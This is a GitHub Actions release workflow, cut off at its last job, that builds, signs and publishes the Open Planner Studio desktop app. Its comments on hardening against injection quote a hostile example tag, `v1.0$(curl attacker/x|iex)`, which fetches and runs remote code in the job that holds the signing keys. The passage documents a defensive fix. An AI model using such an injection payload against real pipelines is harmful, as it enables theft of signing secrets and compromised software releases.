name: Build and Release

on:
  push:
    tags:
      - 'v*'
  workflow_dispatch:
    inputs:
      version:
        description: 'Releasetag met v-prefix, gelijk aan de huidige projectversie'
        required: true

# Minimale default; elke job hieronder zet zelf op wat hij écht nodig heeft
# (`contents: write` voor de jobs die de release schrijven). Zonder deze regel
# erven jobs zonder eigen blok de repo-default.
permissions:
  contents: read

# Bevinding O3. Bewust ÉÉN globale groep (niet per tag) en `cancel-in-progress:
# false`: twee tags kort na elkaar beschrijven allebei dezelfde `latest.json` op
# de release en zouden elkaars updater-entries overschrijven. Annuleren mag hier
# al helemaal niet — een halverwege afgebroken release laat een draft met een
# incomplete assetset achter, en de Windows-leg hangt via `needs` aan de
# Linux/macOS-leg.
concurrency:
  group: release
  cancel-in-progress: false

jobs:
  # Release-gate: ci.yml draait de poorten (`npm run verify`), maar triggert
  # alleen op push/PR naar `main` — een tag matcht geen van beide. Zonder deze
  # poort wordt een tag die bovenop een commit met
  # een rode suite staat gewoon gebouwd, gesigneerd, gepubliceerd en via de
  # auto-updater naar alle bestaande installaties gepusht. De
  # versievergelijking hieronder vangt bovendien een vergeten `npm run bump`:
  # als tag en package.json/tauri.conf.json niet synchroon lopen, vergelijkt de
  # updater gelijke versies en blijft de release voor bestaande installaties
  # STIL onzichtbaar. Bij verschil faalt deze job expliciet vóór create-release.
  gate:
    # De volledige verify in één job duurt ~45 min (typecheck + planning ~15, browser ~29, rest ~1)
    # en raakte op 2026-10-13 in live.yml de grens van 45 min; live.yml wacht daarom nu op ci.yml.
    # Deze gate draait nog serieel (plus vertalingen en highlights), dus ruime marge tot het ook
    # hier in delen gaat.
    timeout-minutes: 90
    permissions:
      contents: read
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v5
        with:
          # De release-highlightsverifier vergelijkt de huidige tag met de
          # vorige stabiele tag en heeft daarom tags plus volledige historie nodig.
          fetch-depth: 0

      - name: Setup Node.js
        uses: actions/setup-node@v5
        with:
          node-version: '22'
          cache: 'npm'

      - name: Install dependencies (npm ci)
        run: npm ci

      # Besluit B5 (2026-10-10): een PR vraagt alleen nl + en, dus main mag met vertalingen
      # achterlopen; een release niet. Elke UI-sleutel moet in elke taal vertaald en actueel zijn
      # (skill update-ui-lang, release-skill stap 2); docs in andere talen mogen achterlopen (2026-10-12).
      # Direct na npm ci, vóór Playwright en de verify: dit faalt in seconden.
      # Bewust niet in `npm run verify`, anders wordt elke PR rood.
      - name: Verify translations (UI in alle talen compleet en actueel)
        run: npm run verify:translations

      - name: Install Playwright Chromium
        run: npx playwright install --with-deps --only-shell chromium

      # Exact dezelfde poort als ci.yml en live.yml — één definitie, in
      # package.json: typecheck (src én scripts/tests) + de vijf testsuites +
      # verify:examples + verify:docs.
      - name: Verify (typecheck, testsuites, examples, docs)
        run: npm run verify

      # Alleen de release-pipeline heeft gegarandeerd een stabiele tag. De
      # highlight-cijfers worden hier daarom tegen die tagrange gevalideerd;
      # gewone ontwikkelverificatie blijft tag-onafhankelijk.
      - name: Verify visual release highlights
        env:
          # Bij dispatch is de ref bijvoorbeeld main; de versie komt uit de invoer.
          # Vrije invoer blijft data via env, nooit shellcode via interpolatie.
          INPUT_VERSION: ${{ github.event.inputs.version }}
        run: |
          set -euo pipefail
          if [ "$GITHUB_EVENT_NAME" = "workflow_dispatch" ]; then
            TAG_VERSION="${INPUT_VERSION:-}"
          else
            TAG_VERSION="${GITHUB_REF#refs/tags/}"
          fi
          node scripts/release-highlights.mjs "${TAG_VERSION#v}"

      - name: Upload Playwright failure artifacts
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: playwright-release-${{ github.job }}-${{ github.run_attempt }}
          path: |
            playwright-report/
            test-results/
          if-no-files-found: ignore
          retention-days: 7

      - name: Verify tag matches bumped version
        env:
          # De dispatch-input is NIET-VERTROUWDE invoer (vrije tekst, geen
          # tekenbeperking) en gaat daarom via een env-blok in plaats van een
          # `${{ }}` rechtstreeks in het shellscript — anders wordt hij letterlijk
          # in de shell geplakt vóórdat die start. `GITHUB_REF`/`GITHUB_EVENT_NAME`
          # zetten we bewust NIET: die zijn al standaard aanwezig in de runner en
          # de `GITHUB_`-prefix is gereserveerd.
          INPUT_VERSION: ${{ github.event.inputs.version }}
        run: |
          set -euo pipefail
          if [ "$GITHUB_EVENT_NAME" = "workflow_dispatch" ]; then
            TAG_VERSION="${INPUT_VERSION:-}"
          else
            TAG_VERSION="${GITHUB_REF#refs/tags/}"
          fi
          # Strip de leidende 'v' (v2026.7.12 -> 2026.7.12).
          TAG_VERSION="${TAG_VERSION#v}"
          node scripts/bump-version.js --check "$TAG_VERSION"

      # Vroege signalering: ontbreekt docs/release-notes/<tag>.md, dan valt de
      # release terug op de generieke tekst en blijft het updater-notes-veld
      # leeg. Bewust een warning en géén fout — de terugval werkt — maar je wilt
      # het weten vóór een build van een half uur, niet erna.
      - name: Check release notes present
        env:
          INPUT_VERSION: ${{ github.event.inputs.version }}
        run: |
          set -euo pipefail
          if [ "$GITHUB_EVENT_NAME" = "workflow_dispatch" ]; then
            TAG_VERSION="${INPUT_VERSION:-}"
          else
            TAG_VERSION="${GITHUB_REF#refs/tags/}"
          fi
          # stderr (waar de ::warning:: op staat) naar de log, stdout weg.
          # De groep leidt stderr om vóór de stdout-omleiding van Node.
          { node scripts/release-notes.mjs "$TAG_VERSION" --format=body >/dev/null; } 2>&1

  create-release:
    needs: gate
    timeout-minutes: 10
    permissions:
      contents: write
    runs-on: ubuntu-latest
    outputs:
      release_id: ${{ steps.create-release.outputs.result }}
      version: ${{ steps.get-version.outputs.version }}

    steps:
      - uses: actions/checkout@v5

      - name: Get version
        id: get-version
        env:
          # Bevinding O1. Een tagnaam en een dispatch-input zijn vrije tekst;
          # een `${{ }}` daarvan wordt LETTERLIJK in het script geplakt vóór de
          # shell start, dus `v1.0$(...)` voert uit. Alles gaat via env.
          # `GITHUB_EVENT_NAME`/`GITHUB_REF` zetten we hier bewust NIET: die zijn
          # al aanwezig in de runner en de `GITHUB_`-prefix is gereserveerd.
          INPUT_VERSION: ${{ github.event.inputs.version }}
        run: |
          set -euo pipefail
          if [ "$GITHUB_EVENT_NAME" = "workflow_dispatch" ]; then
            VERSION="${INPUT_VERSION:-}"
          else
            VERSION="${GITHUB_REF#refs/tags/}"
          fi
          # Whitelist die de hele injectieklasse sluit: deze waarde stroomt door
          # naar een github-script-stap én naar het pwsh-script in de job met de
          # signing-secrets. Twee controles, en ze zijn allebei nodig:
          #
          #  1. Tekenset op de HELE waarde. `case` matcht altijd de volledige
          #     string, dus dit sluit ook een NIEUWE REGEL uit. Zonder deze stap
          #     glipt "v1.2.3\nv9.9.9" door de regex hieronder (grep matcht per
          #     regel) en schrijft de dispatch-input daarna een tweede regel in
          #     $GITHUB_OUTPUT — een output-injectie. Een git-tag kan geen
          #     nieuwe regel bevatten, een dispatch-input wél.
          #  2. Structuur. Na stap 1 bestaat de waarde uitsluitend uit 'v',
          #     cijfers en punten op één regel, dus is de regex sluitend.
          #
          # Na deze poort bevat $VERSION gegarandeerd geen teken dat in een
          # shell, in pwsh of in JS iets betekent. (Dat het óók echte CalVer is,
          # bewaakt de gate hierboven via de vergelijking met package.json.)
          case "$VERSION" in
            *[!v0-9.]*|'')
              echo "::error::Versie bevat tekens buiten 'v', cijfers en punten (of is leeg)." >&2
              exit 1
              ;;
          esac
          if ! printf '%s' "$VERSION" | grep -qE '^v[0-9]+\.[0-9]+\.[0-9]+$'; then
            echo "::error::Versie '$VERSION' heeft niet de vorm vJJJJ.W.N." >&2
            exit 1
          fi
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"

      # De releasetekst komt uit `docs/release-notes/<tag>.md` via
      # scripts/release-notes.mjs; ontbreekt dat bestand, dan levert het script
      # de generieke tekst die hier vroeger hardgecodeerd stond (en logt een
      # warning). De versie gaat via `env` de stap in en NIET via een `${{ }}`
      # in het script zelf: bij workflow_dispatch is dat vrije, niet-vertrouwde
      # tekst die anders letterlijk in de JS-broncode geplakt wordt.
      - name: Create release
        id: create-release
        uses: actions/github-script@v8
        env:
          # Bevinding O1: `'${{ ... }}'` in een script-blok breekt al op een
          # enkele quote en plakt daarna vrije tekst als JS-broncode. Via env +
          # process.env — hetzelfde patroon als publish-release hieronder.
          # (`execFileSync` met een argumentenlijst is om dezelfde reden geen
          # shell-aanroep: de versie gaat als argv-element naar node, niet door
          # een shell heen.)
          VERSION: ${{ steps.get-version.outputs.version }}
        with:
          script: |
            const { execFileSync } = require('node:child_process');
            const version = process.env.VERSION;
            const body = execFileSync(
              'node',
              ['scripts/release-notes.mjs', version, '--format=body'],
              { encoding: 'utf8', stdio: ['ignore', 'pipe', 'inherit'] }
            );
            const { data } = await github.rest.repos.createRelease({
              owner: context.repo.owner,
              repo: context.repo.repo,
              tag_name: version,
              name: `Open Planner Studio ${version}`,
              body,
              draft: true,
              prerelease: false
            });
            return data.id;

  build-linux-mac:
    needs: create-release
    timeout-minutes: 45
    permissions:
      contents: write
    strategy:
      fail-fast: false
      matrix:
        include:
          - platform: 'ubuntu-22.04'
            args: ''
          - platform: 'macos-latest'
            args: '--target universal-apple-darwin'

    runs-on: ${{ matrix.platform }}
    env:
      TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
      TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}

    steps:
      - uses: actions/checkout@v5

      - name: Setup Node.js
        uses: actions/setup-node@v5
        with:
          node-version: 22
          cache: 'npm'

      - name: Install Rust stable
        uses: dtolnay/rust-toolchain@stable

      - name: Install Rust targets (macOS universal)
        if: matrix.platform == 'macos-latest'
        run: rustup target add aarch64-apple-darwin x86_64-apple-darwin

      - name: Install dependencies (Ubuntu only)
        if: matrix.platform == 'ubuntu-22.04'
        run: |
          sudo apt-get update
          sudo apt-get install -y libwebkit2gtk-4.1-dev libappindicator3-dev librsvg2-dev patchelf

      # Bevinding O2: `npm ci` installeert exact wat de lockfile vastlegt en
      # controleert de integriteitshashes — zonder dit was een gesigneerde
      # installer niet reproduceerbaar. Er staat hier bewust GEEN rust-cache
      # (zie ci.yml): een release bouwt uit een schone target-map.
      - name: Install frontend dependencies (npm ci)
        run: npm ci

      # macOS-signing en notarisatie met de organisatie-secrets (APPLE_*), zelfde
      # route als open-pdf-studio. Notarisatie via een App Store Connect API-key:
      # Apple-ID + app-wachtwoord gaf daar een blijvende HTTP 500 op de notary-API.
      # tauri-action importeert het certificaat zelf in een tijdelijke keychain;
      # alleen de .p8-sleutel moet als bestand klaarstaan. Ook de dmg-notarisatie
      # na de build gebruikt dit bestand.
      - name: Write App Store Connect API key (macOS)
        if: matrix.platform == 'macos-latest'
        env:
          APPLE_API_KEY_CONTENT: ${{ secrets.APPLE_API_KEY_CONTENT }}
        run: |
          printf '%s' "$APPLE_API_KEY_CONTENT" > "$RUNNER_TEMP/apple-api-key.p8"
          chmod 600 "$RUNNER_TEMP/apple-api-key.p8"

      - name: Build Tauri app
        uses: tauri-apps/tauri-action@action-v0.6.1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          # Alleen de macOS-leg krijgt de Apple-secrets; Linux krijgt lege waarden.
          APPLE_CERTIFICATE: ${{ matrix.platform == 'macos-latest' && secrets.APPLE_CERTIFICATE || '' }}
          APPLE_CERTIFICATE_PASSWORD: ${{ matrix.platform == 'macos-latest' && secrets.APPLE_CERTIFICATE_PASSWORD || '' }}
          APPLE_SIGNING_IDENTITY: ${{ matrix.platform == 'macos-latest' && secrets.APPLE_SIGNING_IDENTITY || '' }}
          APPLE_API_ISSUER: ${{ matrix.platform == 'macos-latest' && secrets.APPLE_API_ISSUER || '' }}
          APPLE_API_KEY: ${{ matrix.platform == 'macos-latest' && secrets.APPLE_API_KEY || '' }}
          APPLE_API_KEY_PATH: ${{ matrix.platform == 'macos-latest' && format('{0}/apple-api-key.p8', runner.temp) || '' }}
          APPLE_TEAM_ID: ${{ matrix.platform == 'macos-latest' && secrets.APPLE_TEAM_ID || '' }}
        with:
          args: ${{ matrix.args }}
          releaseId: ${{ needs.create-release.outputs.release_id }}
          includeUpdaterJson: true

      # tauri-action notariseert en stapelt alleen de app; de dmg eromheen wordt
      # alleen gesigneerd (en is hierboven al zo naar de draft geüpload). Daarom
      # notariseren en stapelen we de dmg zelf, met dezelfde API-key.
      - name: Notarize and staple dmg (macOS)
        if: matrix.platform == 'macos-latest'
        env:
          APPLE_API_ISSUER: ${{ secrets.APPLE_API_ISSUER }}
          APPLE_API_KEY: ${{ secrets.APPLE_API_KEY }}
          APPLE_API_KEY_PATH: ${{ runner.temp }}/apple-api-key.p8
        run: bash scripts/macos-notarize-dmg.sh src-tauri/target/universal-apple-darwin/release/bundle/dmg

      # Faalt de release als de dmg of de app niet gesigneerd, niet genotariseerd of
      # niet door Gatekeeper geaccepteerd is. De draft blijft dan staan (niet
      # gepubliceerd): build-windows en publish-release hangen via `needs` aan deze job.
      - name: Verify macOS signature and notarization (dmg and app)
        if: matrix.platform == 'macos-latest'
        run: bash scripts/macos-verify-dmg.sh src-tauri/target/universal-apple-darwin/release/bundle/dmg

      # Vervang de dmg die tauri-action vóór de notarisatie uploadde door precies
      # het gecontroleerde bestand. GitHub maakt van spaties in een assetnaam
      # punten; we uploaden onder die puntnaam, zodat --clobber het bestaande
      # asset vervangt in plaats van er een tweede naast te zetten. Daarna eisen
      # we één dmg op de release met dezelfde sha256 als het lokale bestand.
      - name: Replace dmg on the draft with the notarized dmg (macOS)
        if: matrix.platform == 'macos-latest'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          VERSION: ${{ needs.create-release.outputs.version }}
          REPO: ${{ github.repository }}
        run: |
          set -euo pipefail
          DMG_PATH="$(find src-tauri/target/universal-apple-darwin/release/bundle/dmg -name '*.dmg' -print -quit)"
          test -n "$DMG_PATH"
          ASSET_NAME="$(basename "$DMG_PATH" | tr ' ' '.')"
          mkdir -p "$RUNNER_TEMP/dmg-upload" "$RUNNER_TEMP/dmg-check"
          cp "$DMG_PATH" "$RUNNER_TEMP/dmg-upload/$ASSET_NAME"
          gh release upload "$VERSION" "$RUNNER_TEMP/dmg-upload/$ASSET_NAME" --clobber --repo "$REPO"
          DMG_COUNT="$(gh release view "$VERSION" --repo "$REPO" --json assets --jq '[.assets[] | select(.name | endswith(".dmg"))] | length')"
          test "$DMG_COUNT" = 1 || { echo "::error::verwacht 1 dmg op de release, gevonden: $DMG_COUNT" >&2; exit 1; }
          gh release download "$VERSION" --pattern "$ASSET_NAME" --dir "$RUNNER_TEMP/dmg-check" --repo "$REPO"
          LOCAL_SHA="$(shasum -a 256 "$DMG_PATH" | cut -d' ' -f1)"
          RELEASE_SHA="$(shasum -a 256 "$RUNNER_TEMP/dmg-check/$ASSET_NAME" | cut -d' ' -f1)"
          echo "sha256 lokaal: $LOCAL_SHA, op de release: $RELEASE_SHA ($ASSET_NAME)"
          test "$LOCAL_SHA" = "$RELEASE_SHA"

  build-windows:
    needs: [create-release, build-linux-mac]
    timeout-minutes: 45
    permissions:
      contents: write
    runs-on: windows-latest
    env:
      TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
      TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}

    steps:
      - uses: actions/checkout@v5

      - name: Setup Node.js
        uses: actions/setup-node@v5
        with:
          node-version: 22
          cache: 'npm'

      - name: Install Rust stable
        uses: dtolnay/rust-toolchain@stable

      # Bevinding O2 — zie de toelichting in build-linux-mac.
      - name: Install frontend dependencies (npm ci)
        run: npm ci

      # Authenticode tijdens het bundelen (issue #429). Tauri roept signCommand
      # aan voor het programma (open-planner-studio.exe), de NSIS-uninstaller en
      # de installer; vroeger tekende een losse stap ná de build alleen de
      # setup.exe, en bleef het geïnstalleerde programma NotSigned. De
      # signCommand staat bewust NIET in tauri.conf.json maar in een override die
      # alleen deze job (en windows-sign-check.yml) laadt: ci.yml, tauri:dev en
      # lokale builds hebben geen Azure-credentials. De dlib heeft .NET 8 nodig.
      - name: Setup .NET 8 (Artifact Signing-dlib)
        uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'

      - name: Prepare Authenticode signing (Azure Artifact Signing)
        shell: pwsh
        env:
          AZURE_ENDPOINT: ${{ secrets.AZURE_ENDPOINT }}
          AZURE_TRUSTED_SIGNING_ACCOUNT_NAME: ${{ secrets.AZURE_TRUSTED_SIGNING_ACCOUNT_NAME }}
          AZURE_CERTIFICATE_PROFILE_NAME: ${{ secrets.AZURE_CERTIFICATE_PROFILE_NAME }}
        run: pwsh -NoProfile -File scripts/windows-sign.ps1 -Setup

      - name: Build Tauri app
        uses: tauri-apps/tauri-action@action-v0.6.1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          # Voor signCommand (scripts/windows-sign.ps1): EnvironmentCredential van de dlib.
          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
        with:
          args: --config ${{ env.OPS_SIGN_CONFIG }}
          releaseId: ${{ needs.create-release.outputs.release_id }}
          # latest.json wordt uitsluitend door de re-sign-stap hieronder beheerd
          # (na Authenticode); voorkomt dat deze run de linux/macos-entries raakt.
          includeUpdaterJson: false

      # Poort: zonder geldige handtekening met tijdstempel op installer, het
      # geïnstalleerde programma en de uninstaller faalt de job en blijft de
      # release draft (publish-release hangt via `needs` aan deze job).
      # Controleer het programma ZOALS HET IN DE INSTALLER ZIT, niet
      # target/release/open-planner-studio.exe: daar staat na het bundelen een
      # ongetekende kopie (gemeten bij de eerste tag van v2026.10.0, run
      # 39657625310: setup.exe Valid, die kopie NotSigned). Zelfde route als
      # windows-sign-check.yml: stil installeren, controleren, verwijderen.
      - name: Verify Authenticode (installer, program and uninstaller)
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          function Check-File($label, $path) {
            if (-not (Test-Path $path)) { throw "${label}: bestand ontbreekt ($path)" }
            $sig = Get-AuthenticodeSignature -FilePath $path
            Write-Host "${label}: $($sig.Status); $($sig.SignerCertificate.Subject); tijdstempel: $($sig.TimeStamperCertificate.Subject)"
            if ($sig.Status -ne 'Valid' -or $null -eq $sig.TimeStamperCertificate) { throw "${label}: geen geldige Authenticode-handtekening met tijdstempel" }
            & $env:OPS_SIGNTOOL verify /pa /v $path
            if ($LASTEXITCODE -ne 0) { throw "signtool verify faalde voor $label" }
          }

          $setup = Get-ChildItem "$env:GITHUB_WORKSPACE/src-tauri/target/release/bundle/nsis/*-setup.exe" | Select-Object -First 1
          if ($null -eq $setup) { throw "geen *-setup.exe gebouwd" }
          Check-File 'setup.exe (installer)' $setup.FullName

          $p = Start-Process -FilePath $setup.FullName -ArgumentList '/S' -Wait -PassThru
          if ($p.ExitCode -ne 0) { throw "stil installeren faalde (exit $($p.ExitCode))" }
          $keys = @('HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
                    'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*')
          $entry = Get-ItemProperty $keys -ErrorAction SilentlyContinue |
            Where-Object { $_.DisplayName -like 'Open Planner Studio*' } | Select-Object -First 1
          if ($null -eq $entry) { throw "geen Uninstall-sleutel na installeren" }
          $uninst = $entry.UninstallString.Trim('"')
          $dir = Split-Path $uninst
          Check-File 'open-planner-studio.exe (geïnstalleerd)' (Join-Path $dir 'open-planner-studio.exe')
          Check-File "$(Split-Path $uninst -Leaf) (uninstaller)" $uninst

          # Verwijderen ruimt alleen de runner op; dat houdt de release niet tegen.
          $u = Start-Process -FilePath $uninst -ArgumentList '/S' -Wait -PassThru
          if ($u.ExitCode -ne 0) { Write-Host "::warning::stil verwijderen gaf exit $($u.ExitCode)" }

      - name: Re-sign updater artifacts after Authenticode signing
        shell: pwsh
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          # Bevinding O1, en dit was de scherpste van de zes: pwsh evalueert
          # `$(...)` BINNEN een double-quoted string, dus een tagnaam
          # `v1.0$(curl attacker/x|iex)` voerde uit in precies de job die de
          # Tauri-signing-sleutel en alle Azure-credentials in zijn env heeft.
          # Via env leest pwsh de waarde als data, niet als broncode. De
          # CalVer-whitelist in create-release sluit de klasse aan de bron.
          VERSION: ${{ needs.create-release.outputs.version }}
          REPO: ${{ github.repository }}
        run: |
          $ErrorActionPreference = 'Stop'
          $VERSION = $env:VERSION
          $REPO = $env:REPO
          $NSIS_DIR = "$env:GITHUB_WORKSPACE/src-tauri/target/release/bundle/nsis"

          # --- Diagnostics: dump the nsis bundle dir so a future failure shows
          # exactly what Tauri produced (the v2026.6.0 build had NO .nsis.zip here,
          # which is why the old `Get-ChildItem *.nsis.zip` returned $null and
          # `Remove-Item $ZIP.FullName` crashed on a null Path argument).
          Write-Host "=== Contents of $NSIS_DIR ==="
          Get-ChildItem $NSIS_DIR | Select-Object Name | Format-Table -AutoSize | Out-String | Write-Host

          # --- Find the Authenticode-signed installer. This MUST exist; the zip
          # does not have to.
          $EXE = Get-ChildItem "$NSIS_DIR/*-setup.exe" | Select-Object -First 1
          if ($null -eq $EXE) {
            throw "No *-setup.exe found in $NSIS_DIR — cannot build the updater artifact."
          }
          Write-Host "Signed exe: $($EXE.Name)"

          # --- Derive the zip name FROM THE EXE instead of searching for it, so we
          # never depend on a pre-existing .nsis.zip. (e.g. "...x64-setup.exe" ->
          # "...x64-setup.nsis.zip".)
          $ZIP_NAME = $EXE.Name -replace '\.exe$', '.nsis.zip'
          $ZIP_PATH = Join-Path $NSIS_DIR $ZIP_NAME
          if (Test-Path $ZIP_PATH) {
            Remove-Item $ZIP_PATH -Force
          }
          Write-Host "Zip name: $ZIP_NAME"

          # --- Build the .nsis.zip around the signed exe. Use the ZipFile API with
          # CompressionLevel.Optimal (Deflate): Compress-Archive can emit Deflate64,
          # which Tauri's updater cannot decompress. Entry name MUST be the exe's
          # bare filename — that's what the updater extracts and runs.
          Add-Type -AssemblyName System.IO.Compression.FileSystem
          $archive = [System.IO.Compression.ZipFile]::Open($ZIP_PATH, 'Create')
          [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($archive, $EXE.FullName, $EXE.Name, [System.IO.Compression.CompressionLevel]::Optimal)
          $archive.Dispose()
          Write-Host "Built zip: $ZIP_PATH"

          # --- Generate the updater signature for the rebuilt zip.
          # tauri signer sign writes a .sig file next to the input file.
          Remove-Item "$ZIP_PATH.sig" -Force -ErrorAction SilentlyContinue
          npx tauri signer sign "$ZIP_PATH" --private-key "$env:TAURI_SIGNING_PRIVATE_KEY" --password "$env:TAURI_SIGNING_PRIVATE_KEY_PASSWORD"
          if ($LASTEXITCODE -ne 0) { throw "tauri signer sign faalde voor $ZIP_NAME (exit $LASTEXITCODE)" }

          # Read the freshly generated .sig file (the updater `signature` field is
          # the *contents* of the .sig, not a path or URL).
          $ZIP_SIG = (Get-Content "$ZIP_PATH.sig" -Raw).Trim()
          Write-Host "New zip signature: $($ZIP_SIG.Substring(0, [Math]::Min(50, $ZIP_SIG.Length)))..."

          # --- Teken ook de setup.exe opnieuw. tauri-action tekende de exe vóór
          # Authenticode; die oude .exe.sig paste daarna niet meer bij de
          # gepubliceerde exe (gemeten op v2026.9.0, issue #429). Zonder deze stap
          # blijft die verouderde .exe.sig als asset staan.
          # Eerst de oude .sig weg: die bestond al van vóór Authenticode, dus "het
          # bestand bestaat" bewijst niets (review #438, bevinding 6).
          Remove-Item "$($EXE.FullName).sig" -Force -ErrorAction SilentlyContinue
          npx tauri signer sign "$($EXE.FullName)" --private-key "$env:TAURI_SIGNING_PRIVATE_KEY" --password "$env:TAURI_SIGNING_PRIVATE_KEY_PASSWORD"
          if ($LASTEXITCODE -ne 0) { throw "tauri signer sign faalde voor $($EXE.Name) (exit $LASTEXITCODE)" }
          if (-not (Test-Path "$($EXE.FullName).sig")) {
            throw "tauri signer sign schreef geen $($EXE.Name).sig"
          }

          # --- Upload the rebuilt updater artifacts plus the signed installer.
          # (The signed setup.exe is uploaded for humans who download directly.)
          # $ErrorActionPreference stopt niet op een exitcode van een native
          # programma; daarom na elke gh-aanroep zelf $LASTEXITCODE controleren
          # (review release v2026.10.0, bevinding 2).
          gh release upload $VERSION "$ZIP_PATH" "$ZIP_PATH.sig" "$($EXE.FullName)" "$($EXE.FullName).sig" --clobber --repo "$REPO"
          if ($LASTEXITCODE -ne 0) { throw "gh release upload van de Windows-assets faalde (exit $LASTEXITCODE)" }

          # --- Resolve the asset NAME via the API. GitHub rewrites spaces in
          # asset names to dots (e.g. "Open Planner Studio_..." -> "Open.Planner.Studio_..."),
          # so hand-building the name from $ZIP_NAME could mismatch.
          # KRITIEK: gebruik NIET $zipAsset.url — de release is op dit punt nog een
          # DRAFT en de API geeft dan een tijdelijke `releases/download/untagged-…`-
          # URL terug die na publicatie 404't (dit brak Windows-auto-update in
          # v2026.7.1). Bouw daarom zelf de stabiele `releases/latest/download/`-URL,
          # consistent met de linux/macos-entries die tauri-action schrijft.
          $assetsJson = gh release view $VERSION --repo "$REPO" --json assets
          if ($LASTEXITCODE -ne 0) { throw "gh release view faalde (exit $LASTEXITCODE)" }
          $assets = ($assetsJson | ConvertFrom-Json).assets
          # Precies de asset die we net uploadden (GitHub maakt van spaties punten).
          # Geen terugval op een zelfbedachte naam: ontbreekt de asset, dan wijst
          # latest.json naar niets en krijgt geen Windows-installatie een update.
          $expectedZipAsset = $ZIP_NAME -replace ' ', '.'
          $zipAsset = @($assets | Where-Object { $_.name -eq $expectedZipAsset })
          if ($zipAsset.Count -ne 1) {
            throw "Asset $expectedZipAsset staat niet (precies één keer) in de draft; gevonden: $(($assets | ForEach-Object name) -join ', ')"
          }
          $ZIP_ASSET_NAME = $zipAsset[0].name
          $ZIP_URL = "https://github.com/$REPO/releases/latest/download/$ZIP_ASSET_NAME"
          Write-Host "Zip URL: $ZIP_URL"

          # --- Patch latest.json. build-linux-mac already uploaded one with the
          # linux + macos entries; build-windows's own tauri-action run also merged
          # a latest.json, but its Windows signatures predate the Authenticode
          # re-signing and are stale. We SET both Windows keys authoritatively here.
          gh release download $VERSION --pattern "latest.json" --output latest.json --clobber --repo "$REPO"
          if ($LASTEXITCODE -ne 0) { throw "gh release download latest.json faalde (exit $LASTEXITCODE)" }

          $latest = Get-Content latest.json -Raw | ConvertFrom-Json
          if ($null -eq $latest.platforms) {
            $latest | Add-Member -NotePropertyName platforms -NotePropertyValue ([pscustomobject]@{}) -Force
          }

          # Tauri's runtime resolves "windows-x86_64-nsis" first and falls back to
          # "windows-x86_64", so both must carry the zip. Linux/macOS untouched.
          $winEntry = [pscustomobject]@{ signature = $ZIP_SIG; url = $ZIP_URL }
          foreach ($key in @('windows-x86_64', 'windows-x86_64-nsis')) {
            $latest.platforms | Add-Member -NotePropertyName $key -NotePropertyValue $winEntry -Force
            Write-Host "Set $key -> $ZIP_URL (zip signature)"
          }

          $latest | ConvertTo-Json -Depth 10 | Set-Content latest.json -NoNewline
          gh release upload $VERSION latest.json --clobber --repo "$REPO"
          if ($LASTEXITCODE -ne 0) { throw "gh release upload latest.json faalde (exit $LASTEXITCODE)" }

          Write-Host "Windows updater entries set to the .nsis.zip with matching signature"

  # De Claude Desktop-bundel (`.mcpb`): een stekker naar de AI-bridge van de app, zonder signing.
  # Bouwt met `npm run build:mcpb`, controleert het manifest met de officiële CLI (vaste versie,
  # dezelfde als mcpb.yml) en zet het bestand als asset op de draft. Zie docs/mcp-verificatie.md.
  build-mcpb:
    needs: create-release
    timeout-minutes: 15
    permissions:
      contents: write
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v5

      - name: Setup Node.js
        uses: actions/setup-node@v5
        with:
          node-version: 22
          cache: npm

      - name: Install dependencies (npm ci)
        run: npm ci

      - name: Build and upload the Claude Desktop extension (.mcpb)
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          VERSION: ${{ needs.create-release.outputs.version }}
          REPO: ${{ github.repository }}
          MCPB_CLI: '@anthropic-ai/mcpb@2.1.2'
          npm_config_ignore_scripts: 'true'
        run: |
          set -euo pipefail
          node scripts/build-mcpb.mjs --out "$RUNNER_TEMP/mcpb"
          npx --yes "$MCPB_CLI" validate "$RUNNER_TEMP/mcpb/bundle/manifest.json"
          ASSET="$RUNNER_TEMP/mcpb/open-planner-studio-${VERSION#v}.mcpb"
          test -f "$ASSET"
          gh release upload "$VERSION" "$ASSET" --clobber --repo "$REPO"

  publish-release:
    timeout-minutes: 20
    permissions:
      contents: write
    runs-on: ubuntu-latest
    needs: [create-release, build-linux-mac, build-windows, build-mcpb]

    steps:
      - uses: actions/checkout@v5

      # Node 22 zoals de rest van de workflow; verify-release.mjs en
      # release-notes.mjs draaien hier.
      - name: Setup Node.js
        uses: actions/setup-node@v5
        with:
          node-version: 22

      # Het `notes`-veld in latest.json is wat de updater-dialoog toont op het
      # moment dat de update wordt aangeboden. tauri-action laat het leeg, dus
      # zetten we het hier — als laatste stap vóór publicatie, zodat het niet
      # botst met de Windows-re-sign-stap die latest.json óók herschrijft.
      - name: Set updater notes in latest.json
        # Blokkerend: `gh release upload --clobber` verwijdert de oude
        # latest.json vóór de upload. Faalt de upload, dan heeft de release geen
        # manifest meer en vindt geen enkele installatie de update. Dan moet de
        # release een draft blijven (review release v2026.10.0, bevinding 1).
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          VERSION: ${{ needs.create-release.outputs.version }}
